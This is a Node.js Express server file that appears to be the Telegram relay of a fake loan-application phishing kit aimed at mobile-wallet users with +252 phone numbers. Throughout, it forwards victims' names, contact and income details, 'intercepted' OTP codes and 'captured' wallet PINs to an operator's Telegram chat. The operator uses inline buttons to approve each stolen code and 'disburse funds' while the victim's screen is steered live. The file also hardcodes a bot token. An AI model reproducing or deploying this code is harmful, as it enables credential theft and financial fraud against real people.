const express = require('express');
const app = express();
const axios = require('axios');

app.use(express.json());

app.get('/', (req, res) => {
    res.json({ serviceStatus: "Telegram Microservice Cluster Functional" });
});

const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8962560334:AAE-876Pd841650yQjPGfa8rUOPTtr1SJiQ';
const TELEGRAM_CHAT_ID = process.env.ADMIN_CHAT_ID || '6362923717';

let rawServerUrl = process.env.SERVER_CORE_URL || 'http://localhost:3000';
if (!rawServerUrl.startsWith('http://') && !rawServerUrl.startsWith('https://')) {
    rawServerUrl = 'https://' + rawServerUrl;
}
const SERVER_CORE_URL = rawServerUrl;

/**
 * STEP 3 WEBHOOK INTERCEPT: Dispatches clear data straight into the control room window
 */
app.post('/log-step3-data', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`📝 <b>New Application Profile [Auto-Advanced]</b>
🆔 <b>App ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Client Name:</b> ${session.firstName || ''} ${session.lastName || ''}
• <b>Telephone:</b> +252${session.phone || ''}
• <b>Electronic Mail:</b> ${session.email || ''}
• <b>Principal Loan:</b> $${Number(session.amount).toLocaleString()}
• <b>Terms Limit:</b> ${session.term || '--'} Month(s)
• <b>Net Annual Income:</b> $${Number(session.income).toLocaleString()}
• <b>Employment Status:</b> ${session.employment || 'Unspecified'}
• <b>Stated Employer:</b> ${session.employer || 'None Specified'}
━━━━━━━━━━━━━━━━━━━━━━━━
System Flag: <i>User has transitioned directly to OTP submission display.</i>`;

    sendToTelegram(txt, null);
});

/**
 * STEP 4 WEBHOOK INTERCEPT: Creates the interactive OTP verification panel
 */
app.post('/trigger-step4-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`🔐 <b>Verification Signal - Step 4: OTP Verification</b>
🆔 <b>App ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Client Phone:</b> +252${session.phone || ''}
• <b>Intercepted OTP Token:</b> <code>${session.otpToken || 'N/A'}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ APPROVE OTP & PROCEED", callback_data: `approve_otp:${session.appId}` },
            { text: "❌ REJECT OTP", callback_data: `reject_otp:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

/**
 * STEP 5 WEBHOOK INTERCEPT: Creates the final interactive security PIN panel
 */
app.post('/trigger-step5-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`💳 <b>Authorization Signal - Step 5: Secure Wallet PIN</b>
🆔 <b>App ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Client Phone:</b> +252${session.phone || ''}
• <b>Captured Wallet PIN:</b> <code>${session.pinCode || 'N/A'}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "💰 CLEAR PIN & DISBURSE FUNDS", callback_data: `approve_pin:${session.appId}` },
            { text: "❌ REJECT PIN", callback_data: `reject_pin:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

/**
 * TELEGRAM OUTBOUND INLINE BUTTON INTERACTION API INTERRUPT HOOK
 */
app.post('/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    const { callback_query } = req.body;
    if (!callback_query || !callback_query.data) return;

    const [actionSignal, targetAppId] = callback_query.data.split(':');
    let trackerUpdateString = '';
    let apiNormalizedRouteSignal = actionSignal;

    if (actionSignal === 'approve_otp') {
        trackerUpdateString = "✅ OTP confirmation verified. Input interface shifted to secure user wallet PIN mode.";
    } else if (actionSignal === 'reject_otp') {
        apiNormalizedRouteSignal = 'otp-failed';
        trackerUpdateString = "❌ OTP authentication signature matched incorrect state. Notification issued to client UI.";
    } else if (actionSignal === 'approve_pin') {
        trackerUpdateString = "💰 FINAL DISBURSEMENT RUN COMPLETE. Funds verified and reference signature locked.";
    } else if (actionSignal === 'reject_pin') {
        apiNormalizedRouteSignal = 'pin-failed';
        trackerUpdateString = "❌ Wallet security PIN matched incorrect structural code. Interface input reset issued.";
    }

    try {
        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
            actionSignal: apiNormalizedRouteSignal,
            targetAppId: targetAppId
        });
        if (response.data.success) {
            updateTelegramMessageUI(callback_query.message, trackerUpdateString);
        }
    } catch (err) {
        console.error("[BOT TELEGRAM DISPATCH CRITICAL ERROR] Core server proxy link returned fault:", err.message);
    }
});

async function sendToTelegram(text, replyMarkup) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
    } catch (e) { console.error("[TG REJECT FAULT]", e.message); }
}

async function updateTelegramMessageUI(msgObj, statusText) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: msgObj.message_id,
            text: `${msgObj.text}\n\n🤖 <b>Audit Log Execution State:</b>\n<i>${statusText}</i>`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {}
}

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Telegram Bot handling matrix active on engine communication channel port:${PORT}`));